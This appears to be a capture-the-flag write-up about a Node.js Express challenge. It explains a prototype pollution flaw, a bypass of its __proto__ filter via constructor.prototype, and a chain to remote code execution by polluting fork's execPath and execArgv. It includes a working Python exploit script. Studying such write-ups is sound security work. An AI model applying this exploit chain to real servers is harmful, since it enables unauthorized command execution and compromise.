@@ -1,0 +1,81 @@
+Node.js Express application
+Source code is provided
+
++-----------------------------------+
+| Prototype Pollution vulnerability |
++-----------------------------------+
+
+When sending a POST request to '/api/calculate', first thing done is passing req.body to function ObjectHelper.clone.
+This function calls merge function from ObjectHelper passing as first parameter an empty object {} and as second parameter req.body:
+
+    merge(target, source) {
+        for (let key in source) {
+            if (this.isValidKey(key)){
+                if (this.isObject(target[key]) && this.isObject(source[key])) {
+                    this.merge(target[key], source[key]);
+                } else {
+                    target[key] = source[key];
+                }
+            }
+        }
+        return target;
+    }
+
+So, at first glance, ObjectHelper.clone adds every property from req.body (every POST parameter) to an empty new object. 
+If we pass { __proto__ : { lol : 'lol' }}, we will set a new property named lol with value 'lol' to the __proto__ of the new object. 
+Since it's a new empty object, the function which created it is Object, so target.__proto__ points to the Object prototype.
+
+We can basically set any property we want to Object prototype by sending { __proto__ : { <property> : <value of the property> }} 
+as req.body inside a POST request to '/api/calculate'.
+
+Buuut, there is a problem:
+
+    isValidKey(key) {
+        return key !== '__proto__';
+    }
+
+However, we can bypass this. Every object has a constructor property, which points to the function which created the object. 
+Also, we can reffer to constructor.prototype, which is the prototype of the function which created the object. This means that our 
+target.__proto__ is the same as target.constructor.prototype. So, our final payload to inject properties to Object is 
+
+    { constructor : { prototype : { <property> : <value> }}}
+
+
++-----------------------+
+| Remote Code Execution |
++-----------------------+
+
+When accessing /debug/version, child_process.fork is executed:
+
+    let proc = fork('VersionCheck.js', [], {
+        stdio: ['ignore', 'pipe', 'pipe', 'ipc']
+    });
+
+Looking at the documentation, fork accepts two interesting parameters: 
+
+    execPath <string> Executable used to create the child process.
+    execArgv <string[]> List of string arguments passed to the executable. Default: process.execArgv.
+
+If we pass 'ls' as execPath, server will execute 'ls VersionCheck.js'. If we pass 'ls' as execPath and '.' as execArgv,
+server will execute 'ls . VersionCheck.js'.
+
+Function fork will look for this arguments in the object passed. If it doesn't have them, it will look for them in Object.
+As we can set any property we want to Object, we can pass any argument we want to fork, so we have Remote Code Execution :D
+
+We can write a simple script to exploit this:
+
+    import requests
+
+    url = 'http://178.128.40.217:30640'
+
+    command = 'ls'
+    argument = '.'
+
+    s = requests.Session()
+    r = s.post(url + '/api/calculate', json = {'constructor' : { 'prototype' : { 'execPath' : command , 'execArgv' : [ argument ] } } })
+    print(r.text)
+
+    r = s.get(url + '/debug/version')
+    print(r.text)
+
+By executing a simple ls we see the file with the flag. We use cat to get the flag :D
